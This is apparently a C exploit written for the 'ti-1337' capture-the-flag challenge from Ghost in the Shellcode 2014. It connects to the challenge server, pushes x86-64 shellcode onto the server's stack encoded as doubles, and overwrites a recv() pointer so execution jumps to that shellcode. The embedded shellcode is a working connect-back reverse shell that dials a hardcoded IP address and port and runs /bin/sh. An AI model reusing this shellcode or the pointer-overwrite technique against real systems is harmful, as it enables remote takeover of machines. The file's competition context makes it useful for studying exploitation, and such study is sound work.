#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h> 

#define HOST "ti-1337.2014.ghostintheshellcode.com"
#define PORT 31415
#define BUFSIZE 1024

/* This is mostly grabbed from online. */
int get_socket()
{
  int sockfd, portno;
  struct sockaddr_in serveraddr;
  struct hostent *server;
  char *hostname;

  hostname = HOST;
  portno = PORT;

  /* socket: create the socket */
  sockfd = socket(AF_INET, SOCK_STREAM, 0);
  if (sockfd < 0) 
    perror("ERROR opening socket");

  server = gethostbyname(hostname);
  if (server == NULL) {
    fprintf(stderr,"ERROR, no such host as %s\n", hostname);
    exit(0);
  }

  /* build the server's Internet address */
  bzero((char *) &serveraddr, sizeof(serveraddr));
  serveraddr.sin_family = AF_INET;
  bcopy((char *)server->h_addr, 
  (char *)&serveraddr.sin_addr.s_addr, server->h_length);
  serveraddr.sin_port = htons(portno);

  /* connect: create a connection with the server */
  if(connect(sockfd, (struct sockaddr *)&serveraddr, sizeof(serveraddr)) < 0) 
    perror("ERROR connecting");

  printf("Connected!\n");

  return sockfd;
}
/* This pops a double off the server's stack */
void do_pop(int s)
{
  if(send(s, "b\n",  2, 0) != 2)
    perror("send error!");
}

/* This pushes an 8-byte value onto the server's stack. */
void do_push(int s, char *value)
{
  char buf[1024];
  double d;

  /* Convert the value to a double */
  memcpy(&d, value, 8);

  /* Turn the double into a string */
  sprintf(buf, "%.127lg\n", d);
  printf("Pushing %s", buf);

  /* Send it */
  if(send(s, buf, strlen(buf), 0) != strlen(buf))
    perror("send error!");
}

/* This is the place where th program will jump. It's the program's stack. */
#define TARGET "\x50\x31\x60\x00\x00\x00\x00\x00"

/* The address and port for the shellcode */
#define SCPORT "\x41\x41" /* 16705 */
#define SCIPADDR "\xce\xdc\xc4\x3b" /* 206.220.196.59 */

/* The shellcode */
char shellcode[] =
  "\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x4d\x31\xc0\x6a"
  "\x02\x5f\x6a\x01\x5e\x6a\x06\x5a\x6a\x29\x58\x0f\x05\x49\x89\xc0"
  "\x48\x31\xf6\x4d\x31\xd2\x41\x52\xc6\x04\x24\x02\x66\xc7\x44\x24"
  "\x02"SCPORT"\xc7\x44\x24\x04"SCIPADDR"\x48\x89\xe6\x6a\x10"
  "\x5a\x41\x50\x5f\x6a\x2a\x58\x0f\x05\x48\x31\xf6\x6a\x03\x5e\x48"
  "\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x48\x31\xff\x57\x57\x5e\x5a"
  "\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57\x54"
  "\x5f\x6a\x3b\x58\x0f\x05"
  /* End with a bunch of NOPs to make sure it's a multiple of 8 */
  "\x90\x90\x90\x90\x90\x90\x90\x90";

int main(int argc, const char *argv[])
{
  int i;

  /* Create a socket */
  int s = get_socket();


  /* Load the shellcode onto the stack */
  for(i = 0; i < strlen(shellcode); i += 8)
    do_push(s, shellcode + i);
  /* Get the stack back to the start */
  for(i = 0; i < strlen(shellcode); i += 8)
    do_pop(s);

  /* Back up till we get to the pointer to recv()
   * (chosen for no real reason)
   */
  for(i = 0; i < 38; i++)
    do_pop(s);

  /* Overwrite recv() with the address owe want to jump to */
  do_push(s, TARGET);

  /* Send something safe */
  send(s, ".\n", 2, 0);

  /* Don't disconnect right away. */
  sleep(10);

  /* Close cleanly */
  close(s);

  return 0;
}


